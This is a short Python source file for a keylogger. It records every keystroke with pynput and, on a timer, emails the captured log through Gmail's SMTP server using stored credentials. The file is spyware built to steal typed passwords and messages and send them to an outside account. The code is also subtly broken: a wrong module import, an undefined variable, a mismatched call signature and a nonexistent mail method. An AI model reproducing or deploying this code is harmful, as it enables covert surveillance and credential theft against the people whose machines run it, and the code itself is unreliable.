#!/user/bin/env python

# import libary
import smtpd
import threading

from pynput import keyboard 

# Create keylogger class
class Keylogger:
    
    # Define int variable
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "Keylogger starting!!!"
        self.email = email
        self.password = password

    # Create log with the keylogger
    def append_to_log(self, string):
        self.log = self.log + string
    
    # Create keylogger
    def on_press(self, key):
        try:
            press_key = str(key.char)
        except AttributeError:
            if key == key.space:
                press_key = " "
            elif key == key.esc:
                print("Exit the program!!!")
                return False
            else:
                press_key = " " + str(key) + " "
        self.append_to_log(press_key)
    
    # Create connection with the email
    def send_email(self, email, messages):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendEmail(email, email, messages)
        server.quit()
    
    # Create the report
    def report_send(self):
        send_off = self.send_email(self.email, self.password, "\n\n" + self.log)
        self.log = " "
        timer = threading.Timer(self.interval, self.report_send)
        timer.start()
    
    # Start Keylogger
    def start(self):
        keyboard_listener = keyboard.Listener(on_press = self.on_press)
        with keyboard_listener:
            self.report_send()
            keyboard_listener.join()